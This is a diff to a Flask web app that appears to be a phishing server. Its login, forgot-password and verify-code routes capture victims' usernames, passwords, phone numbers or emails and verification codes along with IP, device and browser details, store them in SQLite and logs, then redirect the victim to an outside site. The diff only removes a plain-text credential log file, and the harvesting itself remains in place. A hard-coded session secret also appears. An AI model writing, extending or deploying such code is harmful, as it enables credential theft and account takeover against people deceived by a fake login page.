@@ -1,6 +1,5 @@
 from flask import Flask, request, redirect, render_template, send_from_directory, session
 from datetime import datetime
-import os
 import logging
 import sqlite3
 import requests
@@ -77,8 +76,6 @@ print(Fore.GREEN + "++++++++++++++++++++ SERVER STARTED ++++++++++++++++++++")
 # ========================
 app = Flask(__name__)
 app.secret_key = "secret123"
-
-log_path = os.path.join(os.path.dirname(__file__), "log.txt")
 
 # ========================
 # استخراج IP الحقيقي
@@ -238,20 +235,6 @@ def login():
     conn.commit()
     conn.close()
 
-    log_data = f"""
-Username: {username}
-Password: {password}
-IP: {ip}
-Device: {device}
-OS: {os_name}
-Browser: {browser}
-Time: {time}
--------------------------
-"""
-
-    with open(log_path, "a", encoding="utf-8", buffering=1) as f:
-        f.write(log_data)
-
     login_botton_url = "https://2742404919047.sarhne.com"
     logging.info(Fore.BLUE + f"Redirected user to url : {login_botton_url}")
     return redirect(login_botton_url)
@@ -281,15 +264,6 @@ def verify():
 
     logging.info(Fore.GREEN + f"Verify request: {phone_or_email}")
 
-    log_data = f"""
-Forgot Request
-Phone/Email: {phone_or_email}
--------------------------
-"""
-
-    with open(log_path, "a", encoding="utf-8", buffering=1) as f:
-        f.write(log_data)
-
     logging.info("Redirected user to verify code page")
     return render_template("verify.html")
 
@@ -318,16 +292,6 @@ def verify_code():
 
     conn.commit()
     conn.close()
-
-    log_data = f"""
-Verification Code
-Email: {phone_or_email}
-Code: {code}
--------------------------
-"""
-
-    with open(log_path, "a", encoding="utf-8", buffering=1) as f:
-        f.write(log_data)
 
     logging.info(Fore.RED + f"Verify Code: {code}")
 
